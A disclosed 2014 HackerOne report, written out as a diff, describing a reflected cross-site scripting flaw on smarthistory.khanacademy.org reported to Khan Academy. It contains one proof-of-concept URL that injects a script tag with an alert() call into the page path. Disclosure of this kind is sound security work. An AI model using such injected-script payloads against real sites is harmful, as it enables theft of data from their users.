@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/13285
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bigbear
+ReportedTo:Khan Academy(khanacademy)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.09.2014 5:06:44
+
+Summary:
+
+PoC
+http://smarthistory.khanacademy.org/Campin"><script>alert(/BigBear/)</script>.html
+
+Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
